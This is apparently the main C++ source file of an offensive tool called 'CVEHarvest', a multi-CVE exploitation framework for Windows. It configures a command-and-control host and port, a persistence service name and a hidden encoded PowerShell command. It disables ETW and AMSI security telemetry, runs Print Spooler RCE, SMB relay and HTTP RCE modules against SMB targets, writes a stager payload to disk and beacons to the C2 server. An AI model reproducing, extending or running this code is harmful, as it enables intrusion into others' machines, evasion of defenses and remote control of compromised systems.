#include "CVEHarvest.hpp"

#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

int main(int argc, char** argv) {
    using namespace cveh;

    std::cout << "CVEHarvest - Multi-CVE exploitation framework\n";
    std::cout << "Windows C++20 build\n";

    std::vector<TargetSpec> targets;
    PayloadConfig cfg;
    cfg.output_path = "C:\\Windows\\Temp\\payload.bin";
    cfg.c2_host = "10.0.0.10";
    cfg.c2_port = 443;
    cfg.persistence_name = "svc_update";
    cfg.command = "powershell -nop -w hidden -enc aQBlAHgAIAAyAA==";

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--target" && i + 1 < argc) {
            TargetSpec t;
            t.host = argv[++i];
            t.port = 445;
            t.protocol = "smb";
            targets.push_back(t);
        } else if (arg == "--file" && i + 1 < argc) {
            auto file_targets = Scanner::parse_targets_from_file(argv[++i]);
            targets.insert(targets.end(), file_targets.begin(), file_targets.end());
        } else if (arg == "--c2" && i + 1 < argc) {
            cfg.c2_host = argv[++i];
        } else if (arg == "--port" && i + 1 < argc) {
            cfg.c2_port = static_cast<uint16_t>(std::stoi(argv[++i]));
        } else if (arg == "--output" && i + 1 < argc) {
            cfg.output_path = argv[++i];
        }
    }

    if (targets.empty()) {
        targets.push_back(TargetSpec{"192.168.1.10", 445, "smb", "", "", {}});
    }

    Evasion::hide_console();
    Evasion::patch_etw();
    Evasion::patch_amsi();

    Framework fw;
    fw.add_module(std::make_unique<PrintSpoolerRCE>());
    fw.add_module(std::make_unique<SMBRelayModule>());
    fw.add_module(std::make_unique<HttpRCEProbe>());

    std::string result = fw.run(targets, cfg);
    std::cout << result << "\n";

    PayloadFactory::write_payload_to_disk(PayloadFactory::build_stager(cfg), cfg.output_path);

    C2Client c2(cfg.c2_host, cfg.c2_port, true);
    if (c2.connect()) {
        c2.send_heartbeat();
        std::string ack = c2.recv_response();
        std::cout << "C2 ack: " << ack << "\n";
    }

    return 0;
}
